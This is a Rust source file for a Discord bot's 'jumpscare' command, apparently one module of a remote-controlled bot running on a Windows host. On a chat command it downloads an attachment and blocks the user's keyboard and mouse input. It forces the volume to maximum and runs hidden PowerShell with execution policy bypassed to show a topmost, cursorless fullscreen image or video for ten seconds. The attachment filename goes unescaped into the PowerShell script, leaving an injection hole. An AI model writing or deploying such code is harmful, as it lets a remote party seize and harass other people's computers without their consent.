use crate::commands::*;
use anyhow::Result;
use async_trait::async_trait;
use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;
use twilight_http::Client as HttpClient;
use twilight_model::channel::message::Message;
use std::os::windows::process::CommandExt;
use winapi::um::winuser::BlockInput;

pub struct JumpscareCommand;

#[async_trait]
impl BotCommand for JumpscareCommand {
    fn name(&self) -> &str { "jumpscare" }
    fn description(&self) -> &str { "Display fullscreen jumpscare with attachment for 10 seconds (blocks input)" }
    fn category(&self) -> &str { "utility" }
    fn usage(&self) -> &str { ".jumpscare (with image/video attachment)" }
    fn examples(&self) -> &'static [&'static str] { 
        &[".jumpscare (attach jpg)", ".jumpscare (attach mp4)"] 
    }
    fn aliases(&self) -> &'static [&'static str] { &["scare"] }

    async fn execute(&self, http: &Arc<HttpClient>, msg: &Message, _args: Arguments) -> Result<()> {
        if msg.attachments.is_empty() {
            http.create_message(msg.channel_id)
                .content("Please attach an image or video file.\n**Supported formats:**\n- Images: jpg, jpeg, png, gif, bmp, webp\n- Videos: mp4, webm, avi, mov")
                .await?;
            return Ok(());
        }

        let attachment = &msg.attachments[0];
        let extension = Path::new(&attachment.filename)
            .extension()
            .and_then(|e| e.to_str())
            .unwrap_or("");

        let file_type = Self::validate_file_type(extension)?;

        let status_msg = http
            .create_message(msg.channel_id)
            .content(&format!("Downloading `{}`...", attachment.filename))
            .await?;
        let status_message = status_msg.model().await?;

        let temp_path = Self::get_temp_path(&attachment.filename);

        let client = reqwest::Client::builder()
            .user_agent("Kurinium-Bot/1.0")
            .timeout(std::time::Duration::from_secs(120))
            .build()?;

        match client.get(&attachment.url).send().await {
            Ok(resp) => {
                if !resp.status().is_success() {
                    http.update_message(msg.channel_id, status_message.id)
                        .content(Some(&format!("Failed to download. Status: {}", resp.status())))
                        .await?;
                    return Ok(());
                }

                let bytes = resp.bytes().await?;
                fs::write(&temp_path, &bytes)?;

                http.update_message(msg.channel_id, status_message.id)
                    .content(Some("> Preparing jumpscare..."))
                    .await?;

                match Self::execute_jumpscare(&temp_path, file_type) {
                    Ok(_) => {
                        http.update_message(msg.channel_id, status_message.id)
                            .content(Some("> Jumpscare executed successfully"))
                            .await?;
                    }
                    Err(e) => {
                        http.update_message(msg.channel_id, status_message.id)
                            .content(Some(&format!("Failed to execute jumpscare: {}", e)))
                            .await?;
                    }
                }

                let _ = fs::remove_file(&temp_path);
            }
            Err(e) => {
                http.update_message(msg.channel_id, status_message.id)
                    .content(Some(&format!("Failed to download: {}", e)))
                    .await?;
            }
        }

        Ok(())
    }
}

#[derive(Debug, Clone, Copy)]
enum FileType {
    Image,
    Video,
}

impl JumpscareCommand {
    fn validate_file_type(extension: &str) -> Result<FileType> {
        let ext_lower = extension.to_lowercase();
        
        match ext_lower.as_str() {
            "jpg" | "jpeg" | "png" | "gif" | "bmp" | "webp" => Ok(FileType::Image),
            "mp4" | "webm" | "avi" | "mov" => Ok(FileType::Video),
            _ => Err(anyhow::Error::msg(format!(
                "Unsupported file type: .{}\nSupported: jpg, png, gif, bmp, webp, mp4, webm, avi, mov",
                extension
            ))),
        }
    }

    fn get_temp_path(filename: &str) -> PathBuf {
        std::env::temp_dir().join(format!("kurinium_jumpscare_{}", filename))
    }

    fn execute_jumpscare(file_path: &Path, file_type: FileType) -> Result<()> {
        unsafe {
            BlockInput(1);
        }

        let result = match file_type {
            FileType::Image => Self::show_if(file_path),
            FileType::Video => Self::play_vf(file_path),
        };

        std::thread::sleep(std::time::Duration::from_secs(10));

        unsafe {
            BlockInput(0);
        }
        result
    }

    fn show_if(image_path: &Path) -> Result<()> {
        let ps_script = format!(
            r#"
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object System.Windows.Forms.Form
$form.WindowState = 'Maximized'
$form.FormBorderStyle = 'None'
$form.TopMost = $true
$form.BackColor = [System.Drawing.Color]::Black
$form.Cursor = [System.Windows.Forms.Cursors]::Hide

$pictureBox = New-Object System.Windows.Forms.PictureBox
$pictureBox.Dock = 'Fill'
$pictureBox.SizeMode = 'Zoom'
$pictureBox.BackColor = [System.Drawing.Color]::Black

try {{
    $image = [System.Drawing.Image]::FromFile('{}')
    $pictureBox.Image = $image
}} catch {{
    $form.Close()
    exit 1
}}

$form.Controls.Add($pictureBox)

$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 10000
$timer.Add_Tick({{
    $form.Close()
}})
$timer.Start()

$form.Add_Shown({{
    $form.Activate()
    $form.Focus()
}})

[void]$form.ShowDialog()
$image.Dispose()
"#,
            image_path.display().to_string().replace("\\", "\\\\")
        );

        let mut cmd = Command::new("powershell");
        cmd.args(&["-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", &ps_script])
            .creation_flags(0x08000000);

        cmd.spawn()?.wait()?;
        Ok(())
    }


    fn play_vf(video_path: &Path) -> Result<()> {
        #[cfg(windows)]
        {
            use windows_volume_control::AudioController;
            
            unsafe {
                let mut controller = AudioController::init(None);
                controller.GetSessions();
                controller.GetDefaultAudioEnpointVolumeControl();

                if let Some(session) = controller.get_session_by_name("master".to_string()) {
                    session.setVolume(1.0);
                }
            }
        }

        let video_path_str = video_path.display().to_string();
        
        let ps_script = format!(
            r#"
Add-Type -AssemblyName PresentationCore
Add-Type -AssemblyName PresentationFramework
Add-Type -AssemblyName WindowsBase

[xml]$xaml = @"
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        WindowState="Maximized"
        WindowStyle="None"
        Topmost="True"
        Background="Black"
        Cursor="None">
    <MediaElement Name="MediaPlayer" LoadedBehavior="Manual" UnloadedBehavior="Close" Stretch="Uniform"/>
</Window>
"@

$reader = New-Object System.Xml.XmlNodeReader $xaml
$window = [Windows.Markup.XamlReader]::Load($reader)
$mediaPlayer = $window.FindName("MediaPlayer")

$mediaPlayer.Source = New-Object Uri('{}')
$mediaPlayer.Volume = 1.0
$mediaPlayer.Play()

$timer = New-Object System.Windows.Threading.DispatcherTimer
$timer.Interval = [TimeSpan]::FromSeconds(10)
$timer.Add_Tick({{
    $window.Close()
}})
$timer.Start()

$window.Add_Loaded({{
    $window.Activate()
    $window.Focus()
}})

[void]$window.ShowDialog()
"#,
            video_path_str.replace("\\", "\\\\")
        );

        let mut cmd = Command::new("powershell");
        cmd.args(&["-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", &ps_script])
            .creation_flags(0x08000000);

        cmd.spawn()?.wait()?;
        Ok(())
    }
}
